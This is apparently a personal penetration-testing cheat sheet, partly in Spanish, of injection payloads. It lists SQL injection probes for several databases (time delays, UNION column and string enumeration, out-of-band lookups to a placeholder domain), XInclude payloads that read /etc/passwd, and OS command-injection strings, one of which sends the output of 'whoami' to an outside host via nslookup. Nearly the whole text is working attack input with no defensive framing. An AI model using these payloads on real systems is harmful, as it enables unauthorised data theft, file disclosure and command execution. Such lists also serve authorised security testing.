# SQL Injection

## Database version
~~~sql
SELECT banner FROM v$version
SELECT version FROM v$instance
SELECT @@version
SELECT version()
SELECT @@version
~~~

## Database contents
### PostgreSQL
~~~sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
~~~

## General
~~~sql
'
''
' OR 1=1 -- c
' OR 1=2 -- c
' AND '1'='1
' AND '1'='2
' AND '1'='1' -- c
' AND '1'='2' -- c
'||(SELECT '') -- c
'||(SELECT '' FROM dual) -- c
'||(SELECT '')' -- c
'||(SELECT '' FROM dual)' -- c
'||(SELECT '')|| -- c
'||(SELECT '' FROM dual)|| -- c
'||(SELECT '')||' -- c
'||(SELECT '' FROM dual)||' -- c
' AND CAST((SELECT 1) AS int)-- c
' AND 1=CAST((SELECT 1) AS int)-- c
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END )||' -- c
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL )||' -- c
~~~

## Con delay
~~~sql
' || dbms_pipe.receive_message(('a'),10) -- c
' || WAITFOR DELAY '0:0:10' -- c
' || SELECT pg_sleep(3) -- c
' || SELECT SLEEP(3) -- c
'; dbms_pipe.receive_message(('a'),10) -- c
'; WAITFOR DELAY '0:0:10' -- c
'; SELECT pg_sleep(3) -- c
'; SELECT SLEEP(3) -- c
'; SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),10) ELSE dbms_pipe.receive_message(('a'),0) END -- c
'; SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:00' END -- c
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END -- c
'; SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE SLEEP(0) END -- c
~~~

## Payloads out-of-band interaction
~~~sql
-- Posibles implementaciones Oracle
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{domain}/"> %remote;]>'),'/l') FROM dual) -- c
'||(SELECT UTL_INADDR.get_host_address('{domain}')) -- c
';(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{domain}/"> %remote;]>'),'/l') FROM dual) -- c
';(SELECT UTL_INADDR.get_host_address('{domain}')) -- c
-- Posibles implementaciones Microsoft
'||(exec master..xp_dirtree '//{domain}/a') -- c
';(exec master..xp_dirtree '//{domain}/a') -- c
'-- Posibles implementaciones PostgreSQL
'||(copy (SELECT '') to program 'nslookup {domain}') -- c
';(copy (SELECT '') to program 'nslookup {domain}') -- c
'-- Posibles implementaciones MySQL
'||(LOAD_FILE('\\\\{domain}\\a') '') -- c
'||(SELECT ... INTO OUTFILE '\\\\{domain}\a') -- c
';(LOAD_FILE('\\\\{domain}\\a') '') -- c
';(SELECT ... INTO OUTFILE '\\\\{domain}\a') -- c
~~~

## Encontrar columnas (12)
~~~sql
'
''
' ORDER BY 1 -- c1
' ORDER BY 2 -- c2
' ORDER BY 3 -- c3
' ORDER BY 4 -- c4
' ORDER BY 5 -- c5
' ORDER BY 6 -- c6
' ORDER BY 7 -- c7
' ORDER BY 8 -- c8
' ORDER BY 9 -- c9
' ORDER BY 10 -- c10
' ORDER BY 11 -- c11
' ORDER BY 12 -- c12
' UNION SELECT NULL -- c1
' UNION SELECT NULL,NULL -- c2
' UNION SELECT NULL,NULL,NULL -- c3
' UNION SELECT NULL,NULL,NULL,NULL -- c4
' UNION SELECT NULL,NULL,NULL,NULL,NULL -- c5
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- c6
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c10
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c11
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c12
' UNION SELECT NULL FROM DUAL -- c1
' UNION SELECT NULL,NULL FROM DUAL -- c2
' UNION SELECT NULL,NULL,NULL FROM DUAL -- c3
' UNION SELECT NULL,NULL,NULL,NULL FROM DUAL -- c4
' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM DUAL -- c5
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c6
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c10
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c11
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c12
~~~

## Encontrar strings (9)
~~~sql
'
''
'
' UNION SELECT NULL -- c1
' UNION SELECT 'NULL' -- c1
' UNION SELECT 'NULL',NULL -- c2
' UNION SELECT NULL,'NULL' -- c2
' UNION SELECT 'NULL',NULL,NULL -- c3
' UNION SELECT NULL,'NULL',NULL -- c3
' UNION SELECT NULL,NULL,'NULL' -- c3
' UNION SELECT 'NULL',NULL,NULL,NULL -- c4
' UNION SELECT NULL,'NULL',NULL,NULL -- c4
' UNION SELECT NULL,NULL,'NULL',NULL -- c4
' UNION SELECT NULL,NULL,NULL,'NULL' -- c4
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL -- c5
' UNION SELECT NULL,'NULL',NULL,NULL,NULL -- c5
' UNION SELECT NULL,NULL,'NULL',NULL,NULL -- c5
' UNION SELECT NULL,NULL,NULL,'NULL',NULL -- c5
' UNION SELECT NULL,NULL,NULL,NULL,'NULL' -- c5
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL -- c6
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL -- c6
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL -- c6
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL -- c6
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL -- c6
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL' -- c6
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL,NULL -- c7
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL,NULL -- c7
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL,NULL -- c7
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL,NULL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL,NULL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL',NULL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'NULL' -- c7
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c8
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL,NULL,NULL -- c8
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL,NULL,NULL -- c8
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL,NULL,NULL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL,NULL,NULL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL',NULL,NULL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'NULL',NULL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'NULL' -- c8
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c9
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL,NULL,NULL,NULL -- c9
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL,NULL,NULL,NULL -- c9
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL,NULL,NULL,NULL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL,NULL,NULL,NULL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL',NULL,NULL,NULL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'NULL',NULL,NULL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'NULL',NULL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'NULL' -- c9
' UNION SELECT NULL FROM DUAL -- c1
' UNION SELECT 'NULL' FROM DUAL -- c1
' UNION SELECT 'NULL',NULL FROM DUAL -- c2
' UNION SELECT NULL,'NULL' FROM DUAL -- c2
' UNION SELECT 'NULL',NULL,NULL FROM DUAL -- c3
' UNION SELECT NULL,'NULL',NULL FROM DUAL -- c3
' UNION SELECT NULL,NULL,'NULL' FROM DUAL -- c3
' UNION SELECT 'NULL',NULL,NULL,NULL FROM DUAL -- c4
' UNION SELECT NULL,'NULL',NULL,NULL FROM DUAL -- c4
' UNION SELECT NULL,NULL,'NULL',NULL FROM DUAL -- c4
' UNION SELECT NULL,NULL,NULL,'NULL' FROM DUAL -- c4
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL FROM DUAL -- c5
' UNION SELECT NULL,'NULL',NULL,NULL,NULL FROM DUAL -- c5
' UNION SELECT NULL,NULL,'NULL',NULL,NULL FROM DUAL -- c5
' UNION SELECT NULL,NULL,NULL,'NULL',NULL FROM DUAL -- c5
' UNION SELECT NULL,NULL,NULL,NULL,'NULL' FROM DUAL -- c5
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL FROM DUAL -- c6
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL FROM DUAL -- c6
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL FROM DUAL -- c6
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL FROM DUAL -- c6
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL FROM DUAL -- c6
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL' FROM DUAL -- c6
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c7
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL,NULL FROM DUAL -- c7
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL,NULL FROM DUAL -- c7
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL,NULL FROM DUAL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL,NULL FROM DUAL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL',NULL FROM DUAL -- c7
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'NULL' FROM DUAL -- c7
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c8
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c8
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL,NULL,NULL FROM DUAL -- c8
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL,NULL,NULL FROM DUAL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL,NULL,NULL FROM DUAL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL',NULL,NULL FROM DUAL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'NULL',NULL FROM DUAL -- c8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'NULL' FROM DUAL -- c8
' UNION SELECT 'NULL',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,'NULL',NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,'NULL',NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,NULL,'NULL',NULL,NULL,NULL,NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,'NULL',NULL,NULL,NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'NULL',NULL,NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'NULL',NULL,NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'NULL',NULL FROM DUAL -- c9
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'NULL' FROM DUAL -- c9
~~~

# XXE
~~~bash
%26xxe;
<xinclude xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></xinclude>
<xinclude xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/hostname"/></xinclude>
~~~


# OS Command Injection
## Payloads
~~~bash
ping -c10 127.0.0.1
ping -c10 127.0.0.1 &
& ping -c10 127.0.0.1 &
|| ping -c10 127.0.0.1 ||
sleep 10
sleep 10 &
& sleep 10 &
|| sleep 10 ||
%26 ping -c10 10 127.0.0.1 &
%26 sleep 4
ping -c10 _URL_
ping -c10 _URL_ &
& ping -c10 _URL_ &
|| ping -c10 _URL_ ||
nslookup _URL_
nslookup _URL_ &
& nslookup _URL_ &
|| nslookup _URL_ ||
||nslookup+_URL_||
||ping -c10 +_URL_||
& nslookup `whoami`._URL_ &
& nslookup $(whoami)._URL_ &
~~~

+ https://github.com/payloadbox/command-injection-payload-list
+ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md

# Más información
+ https://portswigger.net/web-security/sql-injection/cheat-sheet
+ https://github.com/GoSecure/dtd-finder/tree/master
+ https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md